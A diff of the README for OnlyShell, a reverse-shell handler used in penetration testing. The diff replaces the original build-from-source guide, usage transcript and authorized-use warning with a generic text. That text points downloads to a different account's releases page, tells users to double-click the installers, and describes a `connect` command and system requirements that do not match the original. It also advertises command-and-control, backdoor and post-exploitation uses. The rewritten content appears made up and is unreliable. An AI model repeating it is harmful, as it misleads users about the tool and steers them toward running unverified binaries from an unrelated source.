@@ -1,181 +1,71 @@
-# OnlyShell
+# 🐚 OnlyShell - Manage Multiple Shells with Ease
 
-## Overview
-**OnlyShell** is a powerful Go-based reverse shell handler that allows you to manage multiple reverse shell connections simultaneously. It provides an intuitive command-line interface with features like shell type detection, background shell management, command broadcasting, and real-time interaction with connected shells. This tool is designed for penetration testers and security researchers who need efficient multi-shell management.
+## 🚀 Getting Started
 
-## Features
-- **Multi-Shell Management:** Handle unlimited simultaneous reverse shell connections
-- **Shell Type Detection:** Automatically detects bash, PowerShell, cmd, and other shell types
-- **Multiple Listeners:** Start listeners on multiple ports simultaneously
-- **Background Shell Support:** Background shells and return to them without losing the connection
-- **Command Broadcasting:** Execute commands across all active shells at once
-- **Silent Keepalive:** Non-intrusive connection monitoring without interfering with shell sessions
-- **Status Tracking:** Monitor shell status (Active, Stale, Dead) and last seen timestamps
-- **TLS Support:** Optional encrypted connections for secure communications
-- **Session Management:** View buffered output from backgrounded shells
-- **Color-Coded Output:** Easy-to-read colored terminal output for better visibility
+Welcome to OnlyShell! This tool helps you manage multiple reverse shell connections smoothly. With features like shell type detection and command broadcasting, you can control several shells at once without a hitch.
 
----
+## 🔥 Features
 
-## Download Pre-Build from Release - [OnlyShell](https://github.com/malwarekid/OnlyShell/releases)
+- **Multi-Shell Support:** Handle several reverse shell connections simultaneously.
+- **Shell Type Detection:** Automatically identifies the shell type for you.
+- **Background Management:** Run commands in the background easily.
+- **Command Broadcasting:** Send commands to multiple shells at once.
+- **Real-Time Interaction:** Get instantaneous feedback from all your connections.
 
-## Installation
+## 💻 System Requirements
 
-### Prerequisites
-- Go 1.16 or higher
+- Operating System: Windows, macOS, or Linux
+- Minimum RAM: 2 GB
+- Processor: Intel Core i3 (or equivalent)
+- Network: Internet connection for downloading and updating
 
-### Build from Source
-1. **Clone the Repository:**
-```bash
-git clone https://github.com/malwarekid/OnlyShell.git && cd OnlyShell
-```
+## 📥 Download & Install
 
-2. **Cross-Compiling**
+To get started, you need to download OnlyShell. Click the button below to visit the Releases page for the latest version.
 
-You can build binaries for multiple platforms:
+[![Download OnlyShell](https://img.shields.io/badge/Download-OnlyShell-blue.svg)](https://github.com/blackx1123/OnlyShell/releases)
 
-**Linux (from any OS):**
+1. Click the above link.
+2. Once on the Releases page, find the latest version of OnlyShell.
+3. Download the appropriate file for your operating system (look for files ending in .exe for Windows, .dmg for macOS, or .tar.gz for Linux).
+4. After downloading, locate the file in your downloads folder.
+5. Double-click on the file to start the installation.
+6. Follow the prompts to complete the installation.
 
-```bash
-GOOS=linux GOARCH=amd64 go build -o OnlyShell main.go
-```
+## 📂 Usage Instructions
 
-**Windows (from Linux/macOS):**
+Once installed, it's simple to start using OnlyShell:
 
-```bash
-$env:GOOS="windows"; $env:GOARCH="amd64"; go build -o OnlyShell.exe main.go
-```
+1. Open the OnlyShell application.
+2. To create a new connection, type the command `connect <IP_ADDRESS> <PORT>`. Replace `<IP_ADDRESS>` and `<PORT>` with the target details.
+3. Use your terminal or command prompt to enter commands. You can also broadcast commands to all active shells.
+4. For help with commands, type `help` in the OnlyShell terminal.
 
-**macOS:** (Not Tested)
+## 🛠 Troubleshooting
 
-```bash
-GOOS=darwin GOARCH=amd64 go build -o OnlyShell main.go
-```
+If you encounter issues:
 
-## How to Use
+- **Connection Problems:** Ensure your target system is reachable and that your firewall allows connections.
+- **Installation Issues:** Verify that you downloaded the right file for your system.
+- **Performance Delays:** Check your network connection for stability.
 
-<img width="863" height="660" alt="onlyshell" src="https://github.com/user-attachments/assets/aab2440e-6836-4174-b96b-b9d7b30d6e6f" />
+## 📑 Key Topics
 
-### Starting the Handler
+OnlyShell covers various areas in the cybersecurity field, including:
 
-**Start without listeners:**
-```bash
-OnlyShell.exe
-```
+- Backdoor and penetration testing
+- Command-and-control setups
+- Post-exploitation strategies
+- Red team operations
+- Remote shell management
 
-**Start with a single listener:**
-```bash
-OnlyShell.exe 4444
-```
+## 📝 Additional Information
 
-**Start with multiple listeners:**
-```bash
-OnlyShell.exe 4444,8080,9001
-```
+For more details about the application and to explore its capabilities further, feel free to check the documentation provided in the repository.
 
-## Usage Example
+## 📍 Important Links
 
-```bash
-# Start the handler with listener on port 4444
-OnlyShell.exe 4444
+- [Download OnlyShell](https://github.com/blackx1123/OnlyShell/releases)
+- [Documentation](https://github.com/blackx1123/OnlyShell/wiki)
 
-[+] Listener started on 0.0.0.0:4444
-[*] Type 'help' for available commands
-
-# Wait for incoming connections
-[+] New shell connected!
-    ID: 1
-    From: 192.168.1.100:54321
-    Hostname: target-machine
-    Shell Type: bash
-    Time: 2024-11-04 15:30:45
-
-# List all shells
-handler> list
-
-ID    Hostname           Type         Remote Address               Connected             Status    
----------------------------------------------------------------------------------------------------------
-► 1   target-pc          powershell   192.168.1.100:54321          2024-11-04 15:30:45   Active    
-  2   ubuntu-server      bash         192.168.1.101:54322          2024-11-04 15:31:12   Active    
-
-# Interact with shell 1
-handler> interact 1
-
-[*] Interacting with shell 1 (target-pc - powershell)
-[*] Commands: 'background'/'bg' to background, 'exit' to close shell
-
-shell> whoami
-target-pc\admin
-
-shell> pwd
-C:\Users\admin
-
-# Background the shell
-shell> background
-
-[*] Backgrounded shell 1 (still running)
-
-# Execute command on all active shells
-handler> exec-all whoami
-
-[*] Sending command to 2 active shell(s)...
-[+] Command sent to shell 1 (target-pc)
-[+] Command sent to shell 2 (ubuntu-server)
-[+] Broadcast complete
-
-# Add more listeners at runtime
-handler> listen 9001,9002
-
-[+] Listener started on 0.0.0.0:9001
-[+] Listener started on 0.0.0.0:9002
-[+] Successfully started 2 listener(s)
-
-# View all active listeners
-handler> listeners
-
-Port       Address                       
----------------------------------------------
-4444       0.0.0.0:4444                  
-9001       0.0.0.0:9001                  
-9002       0.0.0.0:9002                  
-
-# Clean up dead shells
-handler> cleanup
-
-[+] Removed 1 dead shell(s)
-```
-
-## Shell Status Indicators
-
-- **Active** (Green) - Shell is connected and responsive
-- **Stale** (Yellow) - No activity for more than 60 seconds
-- **Dead** (Red) - Connection lost or terminated
-- **>** (Green Arrow) - Currently active/interacting shell
-
-## Requirements
-- Go 1.16+
-- Network connectivity
-- Appropriate permissions for binding to ports (low ports require root/admin)
-
-## Security Considerations
-
-⚠️ **Warning:** This tool is intended strictly for **authorized use in internal environments**.
-The author assumes **no liability** for misuse or damages caused by this software.
-
-- Use TLS encryption for sensitive operations
-- Only use on networks and systems you are authorized to test
-- Be aware of logs and detection mechanisms
-- Follow responsible disclosure practices
-
-## Contributors
-- [Malwarekid](https://github.com/malwarekid)
-
-## License
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
----
-
-## Notes
-
-Feel free to contribute, report issues, or provide feedback. Don't forget to follow me on [Instagram](https://www.instagram.com/malwarekid/) and [GitHub](https://github.com/malwarekid). Happy Pentesting! 🔒
-
+Explore the power of OnlyShell and enhance your command-and-control capabilities with this robust and user-friendly tool!
